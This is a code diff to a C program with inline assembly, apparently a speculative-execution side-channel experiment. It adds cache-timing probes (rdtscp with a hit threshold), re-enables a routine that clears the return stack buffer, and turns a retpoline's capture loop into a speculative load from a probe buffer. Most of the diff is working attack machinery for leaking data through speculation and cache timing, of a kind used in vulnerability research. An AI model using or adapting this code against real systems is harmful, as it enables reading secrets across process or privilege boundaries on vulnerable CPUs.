@@ -67,9 +67,10 @@ void check_probes() {
     uint64_t t0, t1;
     uint8_t *addr;
 
-    int i;
+    int i, mix_i;
     for (i=0; i<NUM_PROBES; i++) {
-        addr = &probe_buf[i*cur_probe_space];
+		mix_i = ((i* 167) +13) & NUM_PROBES-1;
+        addr = &probe_buf[mix_i*cur_probe_space];
         t0 = _rdtscp(&junk);
         asm volatile( "movb (%%rbx), %%al\n"
             :: "b"(addr) : "rax");
@@ -77,7 +78,7 @@ void check_probes() {
         if (t1-t0 < 140) {
             cache_hits++;
             tot_time += t1-t0;
-            results[i]++;
+            results[mix_i]++;
         }
     }
     tot_runs++;
@@ -161,7 +162,7 @@ uint64_t construct_result(uint64_t k, uint64_t width, uint64_t* top_k){
     return final_result;
 }
 
-void flush_probe_buf(){
+static inline __attribute__((always_inline)) void flush_probe_buf_i(){
     // Clear probe_buf from cache
     int j =0;
     for (j=0; j<NUM_PROBES; j++) {
@@ -169,7 +170,12 @@ void flush_probe_buf(){
     }
 }
 
-/*void clear_RSB() {
+void flush_probe_buf(){
+    // Clear probe_buf from cache
+	flush_probe_buf_i();
+}
+
+void clear_RSB() {
     asm volatile (
     "clear_rsb:\n"
         "jmp go\n"
@@ -193,7 +199,7 @@ void flush_probe_buf(){
 
         "ret\n"
     :::);
-}*/
+}
 
 void dilute_RSB() {
     asm volatile(
@@ -270,7 +276,13 @@ void retpoline_r11_yield(){
     "y_inner_indirect_branch:\n"
         "call y_set_up_target\n"
     "y_capture_spec:\n"
-        "pause; lfence\n"
+        "movq $0x11, %%rcx\n"
+        "mov (cur_probe_space), %%rax\n"
+        "imul %%rcx\n"
+        "mov (probe_buf), %%rdx\n"
+        "add %%rax, %%rdx\n"
+        "mov (%%rdx), %%rax\n"
+        // "pause; lfence\n"
         "jmp y_capture_spec\n"
     "y_set_up_target:\n"
         "mov $0x18, %%rax\n"    // sys_sched_yield
@@ -303,7 +315,7 @@ void measure() {
     int i, j;
 
     int misses = 0;
-    uint64_t k = 2;
+    uint64_t k = 3;
     uint64_t width = 8;
     uint64_t top_k_i[k]; 
     uint64_t top_k_res[k]; 
@@ -320,11 +332,12 @@ void measure() {
             //     _mm_clflush(&fn_ptr);
 
             // }
-            // fn_ptr = check_probes;
-            _mm_clflush(&fn_ptr);
+            fn_ptr = check_probes;
+            // _mm_clflush(&fn_ptr);
 
-            // flush_probe_buf();
+			// dilute_RSB();
             // clear_RSB(); 
+            // flush_probe_buf_i();
             retpoline_r11_yield();
 
             usleep(1);
